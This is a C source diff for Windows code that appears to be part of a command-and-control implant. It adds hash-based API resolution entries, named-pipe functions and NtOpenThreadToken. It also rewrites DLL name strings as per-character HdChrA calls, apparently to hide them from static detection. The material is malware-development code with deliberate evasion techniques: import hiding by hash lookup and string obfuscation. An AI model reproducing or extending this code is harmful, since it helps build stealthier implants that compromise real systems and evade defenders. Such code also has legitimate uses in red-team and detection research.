@@ -27,8 +27,12 @@ void* __cdecl memcpy(void* Dst, const void* Src, size_t Size)
 	return Dst;
 }
 
-WINAPIFUNC* ApiWin = NULL;
-NTAPIFUNC*  ApiNt = NULL;
+CHAR HdChrA(CHAR c) { return c; }
+WCHAR HdChrW(WCHAR c) { return c; }
+
+SYSMODULES* SysModules = NULL;
+WINAPIFUNC* ApiWin     = NULL;
+NTAPIFUNC*  ApiNt      = NULL;
 
 BOOL ApiLoad()
 {
@@ -36,8 +40,11 @@ BOOL ApiLoad()
 
 	decltype(LocalAlloc)* allocProc = (decltype(LocalAlloc)*) GetSymbolAddress(hKernel32Module, HASH_FUNC_LOCALALLOC);
 
-	ApiWin = (WINAPIFUNC*) allocProc(LPTR, sizeof(WINAPIFUNC));
-	ApiNt  = (NTAPIFUNC*)  allocProc(LPTR, sizeof(NTAPIFUNC));
+	SysModules = (SYSMODULES*) allocProc(LPTR, sizeof(SYSMODULES));
+	ApiWin     = (WINAPIFUNC*) allocProc(LPTR, sizeof(WINAPIFUNC));
+	ApiNt      = (NTAPIFUNC*)  allocProc(LPTR, sizeof(NTAPIFUNC));
+
+	SysModules->Kernel32 = hKernel32Module;
 
 	if ( ApiWin && hKernel32Module) {
 		// kernel32
@@ -46,8 +53,10 @@ BOOL ApiLoad()
 		ApiWin->CopyFileA				= (decltype(CopyFileA)*)			   GetSymbolAddress(hKernel32Module, HASH_FUNC_COPYFILEA);
 		ApiWin->CreateDirectoryA		= (decltype(CreateDirectoryA)*)		   GetSymbolAddress(hKernel32Module, HASH_FUNC_CREATEDIRECTORYA);
 		ApiWin->CreateFileA				= (decltype(CreateFileA)*)			   GetSymbolAddress(hKernel32Module, HASH_FUNC_CREATEFILEA);
+		ApiWin->CreateNamedPipeA        = (decltype(CreateNamedPipeA)*)		   GetSymbolAddress(hKernel32Module, HASH_FUNC_CREATENAMEDPIPEA);
 		ApiWin->CreatePipe				= (decltype(CreatePipe)*)			   GetSymbolAddress(hKernel32Module, HASH_FUNC_CREATEPIPE);
 		ApiWin->CreateProcessA			= (decltype(CreateProcessA)*)		   GetSymbolAddress(hKernel32Module, HASH_FUNC_CREATEPROCESSA);
+		ApiWin->DisconnectNamedPipe     = (decltype(DisconnectNamedPipe)*)     GetSymbolAddress(hKernel32Module, HASH_FUNC_DISCONNECTNAMEDPIPE);
 		ApiWin->DeleteFileA				= (decltype(DeleteFileA)*)			   GetSymbolAddress(hKernel32Module, HASH_FUNC_DELETEFILEA);
 		ApiWin->GetExitCodeProcess		= (decltype(GetExitCodeProcess)*)	   GetSymbolAddress(hKernel32Module, HASH_FUNC_GETEXITCODEPROCESS);
 		ApiWin->GetExitCodeThread		= (decltype(GetExitCodeThread)*)	   GetSymbolAddress(hKernel32Module, HASH_FUNC_GETEXITCODETHREAD);
@@ -90,19 +99,50 @@ BOOL ApiLoad()
 		ApiWin->Sleep					= (decltype(Sleep)*)				   GetSymbolAddress(hKernel32Module, HASH_FUNC_SLEEP);
 		ApiWin->VirtualAlloc			= (decltype(VirtualAlloc)*)			   GetSymbolAddress(hKernel32Module, HASH_FUNC_VIRTUALALLOC);
 		ApiWin->VirtualFree				= (decltype(VirtualFree)*)			   GetSymbolAddress(hKernel32Module, HASH_FUNC_VIRTUALFREE);
+		ApiWin->WaitNamedPipeA          = (decltype(WaitNamedPipeA)*)	       GetSymbolAddress(hKernel32Module, HASH_FUNC_WAITNAMEDPIPEA);
 		ApiWin->WideCharToMultiByte		= (decltype(WideCharToMultiByte)*)	   GetSymbolAddress(hKernel32Module, HASH_FUNC_WIDECHARTOMULTIBYTE);
 		ApiWin->WriteFile				= (decltype(WriteFile)*)			   GetSymbolAddress(hKernel32Module, HASH_FUNC_WRITEFILE);
 
 		// iphlpapi
-		CHAR iphlpapi_c[] = {'I', 'p', 'h', 'l', 'p', 'a', 'p', 'i', '.', 'd', 'l', 'l', 0};
+		CHAR iphlpapi_c[13];
+		iphlpapi_c[0]  = HdChrA('I');
+		iphlpapi_c[1]  = HdChrA('p');
+		iphlpapi_c[2]  = HdChrA('h');
+		iphlpapi_c[3]  = HdChrA('l');
+		iphlpapi_c[4]  = HdChrA('p');
+		iphlpapi_c[5]  = HdChrA('a');
+		iphlpapi_c[6]  = HdChrA('p');
+		iphlpapi_c[7]  = HdChrA('i');
+		iphlpapi_c[8]  = HdChrA('.');
+		iphlpapi_c[9]  = HdChrA('d');
+		iphlpapi_c[10] = HdChrA('l');
+		iphlpapi_c[11] = HdChrA('l');
+		iphlpapi_c[12] = HdChrA(0);
+	
 		HMODULE hIphlpapiModule = ApiWin->LoadLibraryA(iphlpapi_c);
+		SysModules->Iphlpapi = hIphlpapiModule;
 		if (hIphlpapiModule) {
 			ApiWin->GetAdaptersInfo = (decltype(GetAdaptersInfo)*) GetSymbolAddress(hIphlpapiModule, HASH_FUNC_GETADAPTERSINFO);
 		}
 
 		// advapi32
-		CHAR advapi32_c[] = { 'A', 'd', 'v', 'a', 'p', 'i', '3', '2', '.', 'd', 'l', 'l', 0 };
+		CHAR advapi32_c[13];
+		advapi32_c[0]  = HdChrA('A');
+		advapi32_c[1]  = HdChrA('d');
+		advapi32_c[2]  = HdChrA('v');
+		advapi32_c[3]  = HdChrA('a');
+		advapi32_c[4]  = HdChrA('p');
+		advapi32_c[5]  = HdChrA('i');
+		advapi32_c[6]  = HdChrA('3');
+		advapi32_c[7]  = HdChrA('2');
+		advapi32_c[8]  = HdChrA('.');
+		advapi32_c[9]  = HdChrA('d');
+		advapi32_c[10] = HdChrA('l');
+		advapi32_c[11] = HdChrA('l');
+		advapi32_c[12] = HdChrA(0);
+
 		HMODULE hAdvapi32Module = ApiWin->LoadLibraryA(advapi32_c);
+		SysModules->Advapi32 = hAdvapi32Module;
 		if (hAdvapi32Module) {
 			ApiWin->GetTokenInformation		= (decltype(GetTokenInformation)*)     GetSymbolAddress(hAdvapi32Module, HASH_FUNC_GETTOKENINFORMATION);
 			ApiWin->GetUserNameA			= (decltype(GetUserNameA)*)		       GetSymbolAddress(hAdvapi32Module, HASH_FUNC_GETUSERNAMEA);
@@ -113,8 +153,21 @@ BOOL ApiLoad()
 		}
 
 		// msvcrt
-		CHAR msvcrt_c[] = { 'm', 's', 'v', 'c', 'r', 't', '.', 'd', 'l', 'l', 0 };
+		CHAR msvcrt_c[11];
+		msvcrt_c[0]  = HdChrA('m');
+		msvcrt_c[1]  = HdChrA('s');
+		msvcrt_c[2]  = HdChrA('v');
+		msvcrt_c[3]  = HdChrA('c');
+		msvcrt_c[4]  = HdChrA('r');
+		msvcrt_c[5]  = HdChrA('t');
+		msvcrt_c[6]  = HdChrA('.');
+		msvcrt_c[7]  = HdChrA('d');
+		msvcrt_c[8]  = HdChrA('l');
+		msvcrt_c[9]  = HdChrA('l');
+		msvcrt_c[10] = HdChrA(0);
+
 		HMODULE hMsvcrtModule = ApiWin->LoadLibraryA(msvcrt_c);
+		SysModules->Msvcrt = hMsvcrtModule;
 		if (hMsvcrtModule) {
 #if defined(DEBUG)
 			ApiWin->printf = (printf_t)GetSymbolAddress(hMsvcrtModule, HASH_FUNC_PRINTF);
@@ -123,8 +176,21 @@ BOOL ApiLoad()
 		}
 
 		// Ws2_32
-		CHAR ws2_32_c[] = { 'W', 's', '2', '_', '3', '2', '.', 'd', 'l', 'l', 0 };
+		CHAR ws2_32_c[11];
+		ws2_32_c[0]  = HdChrA('W');
+		ws2_32_c[1]  = HdChrA('s');
+		ws2_32_c[2]  = HdChrA('2');
+		ws2_32_c[3]  = HdChrA('_');
+		ws2_32_c[4]  = HdChrA('3');
+		ws2_32_c[5]  = HdChrA('2');
+		ws2_32_c[6]  = HdChrA('.');
+		ws2_32_c[7]  = HdChrA('d');
+		ws2_32_c[8]  = HdChrA('l');
+		ws2_32_c[9]  = HdChrA('l');
+		ws2_32_c[10] = HdChrA(0);
+
 		HMODULE hWs2_32Module = ApiWin->LoadLibraryA(ws2_32_c);
+		SysModules->Ws2_32 = hWs2_32Module;
 		if (hWs2_32Module) {
 			ApiWin->WSAStartup      = (decltype(WSAStartup)*)      GetSymbolAddress(hWs2_32Module, HASH_FUNC_WSASTARTUP);
 			ApiWin->WSACleanup      = (decltype(WSACleanup)*)      GetSymbolAddress(hWs2_32Module, HASH_FUNC_WSACLEANUP);
@@ -152,6 +218,7 @@ BOOL ApiLoad()
 
 	if (ApiNt) {
 		HMODULE hNtdllModule = GetModuleAddress(HASH_LIB_NTDLL);
+		SysModules->Ntdll = hNtdllModule;
 		if ( hNtdllModule ) {
 			ApiNt->NtClose                   = (decltype(NtClose)*)					  GetSymbolAddress(hNtdllModule, HASH_FUNC_NTCLOSE);
 			ApiNt->NtContinue                = (decltype(NtContinue)*)				  GetSymbolAddress(hNtdllModule, HASH_FUNC_NTCONTINUE);
@@ -160,6 +227,7 @@ BOOL ApiLoad()
 			ApiNt->NtQuerySystemInformation  = (decltype(NtQuerySystemInformation)*)  GetSymbolAddress(hNtdllModule, HASH_FUNC_NTQUERYSYSTEMINFORMATION);
 			ApiNt->NtOpenProcess             = (decltype(NtOpenProcess)*)			  GetSymbolAddress(hNtdllModule, HASH_FUNC_NTOPENPROCESS);
 			ApiNt->NtOpenProcessToken        = (decltype(NtOpenProcessToken)*)		  GetSymbolAddress(hNtdllModule, HASH_FUNC_NTOPENPROCESSTOKEN);
+			ApiNt->NtOpenThreadToken         = (decltype(NtOpenThreadToken)*)		  GetSymbolAddress(hNtdllModule, HASH_FUNC_NTOPENTHREADTOKEN);
 			ApiNt->NtTerminateThread         = (decltype(NtTerminateThread)*)		  GetSymbolAddress(hNtdllModule, HASH_FUNC_NTTERMINATETHREAD);
 			ApiNt->NtTerminateProcess        = (decltype(NtTerminateProcess)*)		  GetSymbolAddress(hNtdllModule, HASH_FUNC_NTTERMINATEPROCESS);
 			ApiNt->RtlGetVersion             = (decltype(RtlGetVersion)*)			  GetSymbolAddress(hNtdllModule, HASH_FUNC_RTLGETVERSION);
